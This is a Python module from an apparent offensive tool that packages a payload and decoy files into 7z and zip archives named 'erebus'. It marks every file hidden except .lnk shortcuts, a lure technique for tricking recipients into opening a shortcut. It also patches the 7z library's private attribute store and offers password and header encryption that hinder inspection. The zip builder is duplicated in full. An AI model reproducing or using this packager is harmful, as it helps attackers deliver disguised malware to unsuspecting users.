import pathlib
import shutil
import subprocess
import zipfile
import py7zr

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
DEFAULT_ROOT = REPO_ROOT / "agent_code"

VISIBLE_EXTENSIONS = {'.lnk'}

def build_7z(compression: str = "9",
             password: str = None,
             build_path: pathlib.Path = None) -> pathlib.Path:
    root_dir = build_path if build_path else DEFAULT_ROOT
    container_dir = root_dir / "container"
    payload_dir = root_dir / "payload"
    decoy_dir = root_dir / "decoys"

    try:
        for item in decoy_dir.rglob('*'):
            if item.is_file() and not item.name.startswith('.'):
                relative_path = item.relative_to(decoy_dir)
                target = payload_dir / relative_path
                target.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, target)

        archive_name = "erebus.7z"
        archive_path = container_dir / "7z" / archive_name
        archive_path.parent.mkdir(parents=True, exist_ok=True)

        filters = [{'id': py7zr.FILTER_LZMA2, 'preset': int(compression)}]

        with py7zr.SevenZipFile(
            archive_path, 
            'w', 
            filters=filters, 
            password=password,
            header_encryption=True if password else False
        ) as archive:
            for item in payload_dir.rglob('*'):
                if item.is_file() and not item.name.startswith('.'):
                    arcname = item.relative_to(payload_dir)
                    archive.write(item, arcname)

            #Patch Attributes in Internal Object Store
            # Iterate over the ArchiveFile objects stored in memory
            for f in archive.files:
                # 'f' is an ArchiveFile instance. It has a .filename property.
                if hasattr(f, 'filename'):
                    p = pathlib.Path(f.filename)
                    attr = 0x20
                    
                    # Logic: If extension is NOT visible, force HIDDEN (0x02)
                    if p.suffix.lower() not in VISIBLE_EXTENSIONS:
                        attr |= 0x02 
                    
                    # DIRECT ACCESS: Modify the private _file_info dictionary.
                    # This is necessary because f.attributes is read-only/computed.
                    # This modification persists because the header is written on exit.
                    if hasattr(f, '_file_info') and isinstance(f._file_info, dict):
                        f._file_info['attributes'] = attr

        return archive_path

    except Exception as e:
        raise RuntimeError(f"7z creation failed: {e}")

def build_zip(compression: int = 9,
              password: str = None,
              build_path: pathlib.Path = None) -> pathlib.Path:
    root_dir = build_path if build_path else DEFAULT_ROOT
    container_dir = root_dir / "container"
    payload_dir = root_dir / "payload"
    decoy_dir = root_dir / "decoys"

    try:
        for item in decoy_dir.rglob('*'):
            if item.is_file() and not item.name.startswith('.'):
                tgt = payload_dir / item.relative_to(decoy_dir)
                tgt.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, tgt)

        container_dir.mkdir(parents=True, exist_ok=True)
        zip_path = container_dir / "zip" / "erebus.zip"
        zip_path.parent.mkdir(parents=True, exist_ok=True)

        compress_type = zipfile.ZIP_DEFLATED if int(compression) > 0 else zipfile.ZIP_STORED

        with zipfile.ZipFile(zip_path, 'w', compression=compress_type) as zf:
            if password:
                zf.setpassword(password.encode())

            for item in payload_dir.rglob('*'):
                if item.is_file() and not item.name.startswith('.'):
                    arcname = item.relative_to(payload_dir)
                    zinfo = zipfile.ZipInfo.from_file(item, arcname)
                    zinfo.create_system = 0 
                    attr = 0x20 
                    if item.suffix.lower() not in VISIBLE_EXTENSIONS:
                        attr |= 0x02
                    zinfo.external_attr = (attr & 0xFF)
                    with open(item, "rb") as f:
                        zf.writestr(zinfo, f.read())

        return zip_path

    except Exception as e:
        raise RuntimeError(f"Zip creation failed: {e}")

def build_zip(compression: int = 9,
              password: str = None,
              build_path: pathlib.Path = None) -> pathlib.Path:
    root_dir = build_path if build_path else DEFAULT_ROOT
    container_dir = root_dir / "container"
    payload_dir = root_dir / "payload"
    decoy_dir = root_dir / "decoys"

    try:
        for item in decoy_dir.rglob('*'):
            if item.is_file() and not item.name.startswith('.'):
                tgt = payload_dir / item.relative_to(decoy_dir)
                tgt.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, tgt)

        container_dir.mkdir(parents=True, exist_ok=True)
        zip_path = container_dir / "zip" / "erebus.zip"
        zip_path.parent.mkdir(parents=True, exist_ok=True)
        
        compress_type = zipfile.ZIP_DEFLATED if int(compression) > 0 else zipfile.ZIP_STORED

        with zipfile.ZipFile(zip_path, 'w', compression=compress_type) as zf:
            if password:
                zf.setpassword(password.encode())

            for item in payload_dir.rglob('*'):
                if item.is_file() and not item.name.startswith('.'):
                    arcname = item.relative_to(payload_dir)
                    zinfo = zipfile.ZipInfo.from_file(item, arcname)
                    zinfo.create_system = 0 
                    attr = 0x20 
                    
                    if item.suffix.lower() not in VISIBLE_EXTENSIONS:
                        attr |= 0x02
                        
                    zinfo.external_attr = (attr & 0xFF)
                    
                    with open(item, "rb") as f:
                        zf.writestr(zinfo, f.read())

        return zip_path

    except Exception as e:
        raise RuntimeError(f"Zip creation failed: {e}")